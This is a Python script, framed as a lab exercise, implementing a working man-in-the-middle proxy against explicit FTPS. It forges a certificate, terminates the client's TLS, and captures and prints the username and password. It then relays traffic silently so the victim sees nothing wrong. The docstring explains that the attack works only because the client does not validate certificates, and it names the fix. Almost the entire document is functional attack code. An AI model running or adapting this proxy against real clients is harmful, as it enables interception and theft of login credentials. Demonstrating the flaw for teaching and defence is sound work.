#!/usr/bin/env python3
"""
mitm_ftps.py -- active man-in-the-middle against explicit FTPS (LAB ONLY).

Point of the exercise: TLS by itself is NOT enough. Because the client trusts
ANY certificate (ftpsTrustAllCerts=true in JFTP, or curl -k), this proxy can
sit between client and server, answer the client's AUTH TLS with its OWN
*forged* certificate, terminate that TLS, and read the supposedly-encrypted
login in cleartext -- then relay to the real server so nothing looks wrong.

    client --TLS(FORGED cert)--> [ MITM :2121 ] --TLS--> real FTPS server :2122
            (client accepts it                   (proxy is just another
             because it validates                 TLS client here)
             no certificate)

Run:
    python ftps_server.py 2122          # the real server, moved to 2122
    python mitm_ftps.py 2121 2122       # proxy: listen 2121, forward to 2122
    # then point the client (JFTP / curl -k) at 127.0.0.1:2121

What it proves / WHERE TO FIX:
    The capture succeeds only because the client does not verify the server's
    certificate. Set ftpsTrustAllCerts=false and trust the real cert (import it
    into a truststore) -- then the forged cert fails the handshake, the client
    aborts, and this attack dies. That cert-validation step is the fix.
"""
import os, socket, ssl, sys, threading, datetime, ipaddress

HERE   = os.path.dirname(os.path.abspath(__file__))
LPORT  = int(sys.argv[1]) if len(sys.argv) > 1 else 2121   # where the client connects
TPORT  = int(sys.argv[2]) if len(sys.argv) > 2 else 2122   # the real server
FCERT  = os.path.join(HERE, "attacker_cert.pem")
FKEY   = os.path.join(HERE, "attacker_key.pem")


def ensure_forged_cert():
    """Generate the attacker's self-signed cert if it isn't there yet."""
    if os.path.exists(FCERT) and os.path.exists(FKEY):
        return
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "127.0.0.1")])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name)
            .public_key(key.public_key()).serial_number(x509.random_serial_number())
            .not_valid_before(now).not_valid_after(now + datetime.timedelta(days=365))
            .add_extension(x509.SubjectAlternativeName([x509.IPAddress(ipaddress.ip_address("127.0.0.1"))]), critical=False)
            .sign(key, hashes.SHA256()))
    open(FCERT, "wb").write(cert.public_bytes(serialization.Encoding.PEM))
    open(FKEY, "wb").write(key.private_bytes(serialization.Encoding.PEM,
          serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))
    print(f"[mitm] generated forged cert {os.path.basename(FCERT)}")


def recv_line(sock):
    buf = b""
    while not buf.endswith(b"\n"):
        try:
            ch = sock.recv(1)
        except Exception:
            break
        if not ch:
            break
        buf += ch
    return buf


def recv_response(sock):
    """Read a (possibly multi-line) FTP response; final line is 'NNN ...'."""
    data = b""
    while True:
        line = recv_line(sock)
        if not line:
            break
        data += line
        s = line.rstrip(b"\r\n")
        if len(s) >= 4 and s[:3].isdigit() and s[3:4] == b" ":
            break
    return data


def pipe(a, b):
    try:
        while True:
            d = a.recv(4096)
            if not d:
                break
            b.sendall(d)
    except Exception:
        pass


def handle(client, caddr):
    server = socket.create_connection(("127.0.0.1", TPORT))
    print(f"\n[mitm] client {caddr} connected -> relaying to 127.0.0.1:{TPORT}")
    creds = {}
    # relay the server banner (220) to the client
    client.sendall(recv_response(server))

    while True:
        line = recv_line(client)
        if not line:
            break
        cmd = line.decode(errors="replace").strip()
        up = cmd.upper()
        shown = "PASS ****" if up.startswith("PASS") else cmd
        print(f"   [C->S] {shown}")
        if up.startswith("USER"):
            creds["user"] = cmd[5:].strip()
        if up.startswith("PASS"):
            creds["pass"] = cmd[5:].strip()

        server.sendall(line)
        resp = recv_response(server)
        print(f"   [S->C] {resp.decode(errors='replace').strip()}")
        client.sendall(resp)

        # the moment the client agrees to TLS: hand it our FORGED cert
        if up.startswith("AUTH") and resp.startswith(b"234"):
            sctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            sctx.load_cert_chain(FCERT, FKEY)
            client = sctx.wrap_socket(client, server_side=True)   # client thinks we're the server
            cctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            cctx.check_hostname = False
            cctx.verify_mode = ssl.CERT_NONE
            server = cctx.wrap_socket(server, server_hostname="127.0.0.1")  # we're a client to the real server
            print("   [mitm] *** TLS up with FORGED cert -- client ACCEPTED it (no validation). "
                  "Control channel now readable. ***")

        # once login succeeds we already have what we came for; go transparent
        if resp.startswith(b"230"):
            print("\n" + "=" * 60)
            print("  CREDENTIALS STOLEN THROUGH 'ENCRYPTED' FTPS:")
            print(f"    username: {creds.get('user','?')}")
            print(f"    password: {creds.get('pass','?')}")
            print("=" * 60)
            print("  (relaying the rest transparently so the victim sees nothing wrong)\n")
            t1 = threading.Thread(target=pipe, args=(client, server), daemon=True)
            t2 = threading.Thread(target=pipe, args=(server, client), daemon=True)
            t1.start(); t2.start(); t1.join(); t2.join()
            break

    try: client.close()
    except Exception: pass
    try: server.close()
    except Exception: pass


def main():
    ensure_forged_cert()
    ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind(("127.0.0.1", LPORT))
    ls.listen(5)
    print(f"[mitm] listening on 127.0.0.1:{LPORT}, forwarding to 127.0.0.1:{TPORT}", flush=True)
    while True:
        c, a = ls.accept()
        threading.Thread(target=handle, args=(c, a), daemon=True).start()


if __name__ == "__main__":
    main()